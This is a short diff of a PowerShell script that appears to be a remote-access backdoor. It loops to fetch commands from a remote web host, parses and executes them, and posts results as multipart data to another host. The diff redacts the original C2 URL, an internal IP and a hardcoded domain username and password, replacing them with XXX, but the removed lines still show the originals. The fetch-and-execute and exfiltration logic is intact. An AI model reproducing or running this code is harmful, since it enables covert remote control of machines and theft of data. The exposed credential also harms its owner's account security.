@@ -7,7 +7,7 @@ while(1)
         Try
             {
                 #(cmd.exe /c del C:\Users\Public\commands.txt); -ErrorAction Stop
-                $comma = $client.DownloadString("https://1-33-7.com/comma"); #-ErrorAction Stop
+                $comma = $client.DownloadString("https://XXX/comma"); #-ErrorAction Stop
                 $cmd = $comma -split "}{}{}{"
                 if($cmd[0] -eq "sexec")
                     {
@@ -28,7 +28,7 @@ while(1)
            if($comma -ne $fil)
                 {
            
-                    #$creds = New-Object System.Management.Automation.PSCredential("analyst-dom\otzar",(ConvertTo-SecureString "Analyst2017!" -AsPlainText -Force))
+                    #$creds = New-Object System.Management.Automation.PSCredential("XXX",(ConvertTo-SecureString "XXX" -AsPlainText -Force))
                     $boundary = [System.Guid]::NewGuid().ToString()
                     $LF = "`r`n"
                     $body = (
@@ -40,7 +40,7 @@ while(1)
 
                     write-host $body
                     start-sleep -m 500
-                    Invoke-RestMethod -Uri "http://172.16.100.140/" -Method Post -ContentType "multipart/form-data; boundary=----------$boundary" -Body $body 
+                    Invoke-RestMethod -Uri "http://XXX/" -Method Post -ContentType "multipart/form-data; boundary=----------$boundary" -Body $body 
                     [io.file]::writealltext("c:\\users\\public\\old.txt",$comma)
                 }
             else
